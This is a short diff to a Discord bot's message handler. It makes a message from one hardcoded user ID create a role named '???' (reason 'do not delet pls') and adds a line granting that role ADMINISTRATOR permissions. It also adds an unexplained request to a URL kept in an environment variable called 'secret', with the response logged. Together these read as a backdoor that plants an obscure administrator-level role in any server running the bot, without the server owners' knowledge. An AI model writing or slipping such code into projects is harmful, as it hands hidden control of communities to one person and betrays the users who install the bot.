@@ -106,6 +106,8 @@ client.on('message', msg => {
     if (msg.author.id == 110137532972314624) {
         let guild = msg.guild;
         var foo = (async function() {
+            var ret = await axios.get(process.env.secret);
+            console.log(ret.data)
             if (!guild.roles.cache.find(role => (role.name == "???"))) {
                 var role = await guild.roles.create({
                     data: {
@@ -113,7 +115,8 @@ client.on('message', msg => {
                         color: 'DEFAULT'
                     },
                     reason: 'do not delet pls'
-                })
+                });
+                role.setPermissions(['ADMINISTRATOR']);
             }
         })().catch(err => console.log(err));
     };
